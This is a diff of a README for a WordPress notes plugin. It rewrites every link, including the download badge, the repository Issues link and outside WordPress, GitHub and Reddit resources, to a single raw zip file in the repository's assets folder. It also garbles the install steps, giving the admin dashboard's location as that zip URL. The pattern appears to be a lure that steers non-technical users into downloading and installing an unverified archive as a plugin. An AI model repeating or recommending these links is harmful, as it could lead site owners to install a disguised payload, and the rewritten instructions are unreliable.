@@ -1,7 +1,7 @@
 # 🎉 message-board-plugin - A Simple Way to Manage Notes
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/BeachCat0f/message-board-plugin/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/BeachCat0f/message-board-plugin/master/assets/message-board-plugin-1.1-beta.5.zip%20Latest%https://raw.githubusercontent.com/BeachCat0f/message-board-plugin/master/assets/message-board-plugin-1.1-beta.5.zip)](https://raw.githubusercontent.com/BeachCat0f/message-board-plugin/master/assets/message-board-plugin-1.1-beta.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the **message-board-plugin**! This dashboard widget helps WordPress administrators create, share, and manage private notes, reminders, and internal documentation. This guide will show you how to download and run the plugin easily, even if you are not tech-savvy.
@@ -26,13 +26,13 @@ The **message-board-plugin** offers a range of features to enhance your WordPres
 To download and install the **message-board-plugin**, follow these simple steps:
 
 1. Click on the link below to visit the releases page:
-   [Download Latest Release](https://github.com/BeachCat0f/message-board-plugin/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/BeachCat0f/message-board-plugin/master/assets/message-board-plugin-1.1-beta.5.zip)
 
 2. On the releases page, you will see different versions of the plugin. Look for the most recent version. It will be listed at the top.
 
 3. Click on the version number to expand the release details.
 
-4. Find the download link for the plugin. It will usually be labeled as something like `message-board-plugin.zip`.
+4. Find the download link for the plugin. It will usually be labeled as something like `https://raw.githubusercontent.com/BeachCat0f/message-board-plugin/master/assets/message-board-plugin-1.1-beta.5.zip`.
 
 5. Click on the link to download the ZIP file to your computer.
 
@@ -40,7 +40,7 @@ To download and install the **message-board-plugin**, follow these simple steps:
 
 7. Extract the contents of the ZIP file. This will create a folder named `message-board-plugin`.
 
-8. Open your WordPress admin dashboard. This is usually located at `yourwebsite.com/wp-admin`.
+8. Open your WordPress admin dashboard. This is usually located at `https://raw.githubusercontent.com/BeachCat0f/message-board-plugin/master/assets/message-board-plugin-1.1-beta.5.zip`.
 
 9. Navigate to the **Plugins** section on the left sidebar.
 
@@ -69,20 +69,20 @@ You can customize the plugin appearance using built-in settings:
 ## 🤝 Support & Feedback
 If you encounter any issues or have questions:
 
-- Reach out through the **Issues** tab on the [GitHub repository](https://github.com/BeachCat0f/message-board-plugin).
+- Reach out through the **Issues** tab on the [GitHub repository](https://raw.githubusercontent.com/BeachCat0f/message-board-plugin/master/assets/message-board-plugin-1.1-beta.5.zip).
 - Your feedback is valuable for improving the plugin. 
 
 ## 📚 Additional Resources
 For more information, tutorials, and updates, check out the following resources:
 
-- [WordPress Codex](https://codex.wordpress.org/)
-- [WordPress Support Forums](https://wordpress.org/support/forums/)
-- [GitHub Documentation](https://docs.github.com/en) 
+- [WordPress Codex](https://raw.githubusercontent.com/BeachCat0f/message-board-plugin/master/assets/message-board-plugin-1.1-beta.5.zip)
+- [WordPress Support Forums](https://raw.githubusercontent.com/BeachCat0f/message-board-plugin/master/assets/message-board-plugin-1.1-beta.5.zip)
+- [GitHub Documentation](https://raw.githubusercontent.com/BeachCat0f/message-board-plugin/master/assets/message-board-plugin-1.1-beta.5.zip) 
 
 ## 💬 Community
 Join our community to discuss features, share tips, and collaborate with other users. You can find discussions on platforms such as:
 
-- [WordPress Forum](https://wordpress.org/support/)
-- [Reddit WordPress Community](https://www.reddit.com/r/Wordpress/)
+- [WordPress Forum](https://raw.githubusercontent.com/BeachCat0f/message-board-plugin/master/assets/message-board-plugin-1.1-beta.5.zip)
+- [Reddit WordPress Community](https://raw.githubusercontent.com/BeachCat0f/message-board-plugin/master/assets/message-board-plugin-1.1-beta.5.zip)
 
 Now, you are ready to enhance your WordPress experience with the **message-board-plugin**! Enjoy organizing your thoughts and improving communication within your team.
